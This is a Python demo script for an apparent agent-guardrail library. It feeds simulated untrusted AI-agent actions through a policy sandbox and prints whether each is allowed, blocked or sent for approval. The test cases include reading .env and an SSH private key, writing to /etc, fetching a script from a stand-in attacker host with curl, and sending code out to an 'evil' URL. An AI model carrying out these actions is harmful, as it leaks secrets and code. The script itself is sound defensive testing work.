"""Demo: simulate a user sharing codebase + untrusted agent actions."""
from __future__ import annotations
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from agentguard.policy import load_policy, PolicyEngine
from agentguard.sandbox import GuardedSandbox

def run_demo(log_path="logs/audit.jsonl"):
    # fresh log for demo
    Path(log_path).parent.mkdir(parents=True, exist_ok=True)
    if Path(log_path).exists():
        Path(log_path).unlink()
    pe = PolicyEngine(load_policy("agentguard.yaml"))
    sb = GuardedSandbox(pe, log_path=log_path)
    # setup fake shared codebase
    Path("workspace").mkdir(exist_ok=True)
    Path("workspace/app.py").write_text("print('shared codebase')\n")
    scenarios = [
        ("READ shared file", lambda: sb.read_file("workspace/app.py")),
        ("READ .env (secret)", lambda: sb.read_file(".env")),
        ("READ ssh key", lambda: sb.read_file("~/.ssh/id_rsa")),
        ("WRITE workspace (ok)", lambda: sb.write_file("workspace/out.txt", "hello")),
        ("WRITE outside (blocked)", lambda: sb.write_file("/etc/hack.txt", "x")),
        ("EXEC pytest (ok)", lambda: sb.run_command("pytest -q")),
        ("EXEC curl evil (blocked)", lambda: sb.run_command("curl https://evil-example.com/x.sh")),
        ("EXEC git push (approval)", lambda: sb.run_command("git push origin main")),
        ("NET github (ok)", lambda: sb.check_url("https://api.github.com/repos")),
        ("NET evil exfil (blocked)", lambda: sb.check_url("https://evil-example.com/steal?code=xxx")),
    ]
    results = []
    for name, fn in scenarios:
        try:
            fn()
            results.append((name, "ALLOWED/APPROVAL"))
        except PermissionError as e:
            msg = str(e)
            verdict = "APPROVAL" if "APPROVAL" in msg else "BLOCKED"
            results.append((name, verdict))
        except Exception as e:  # e.g. file missing still counts as policy pass
            results.append((name, f"ERROR: {e}"))
    for name, verdict in results:
        print(f"{name:28} -> {verdict}")
    return results

if __name__ == "__main__":
    run_demo()
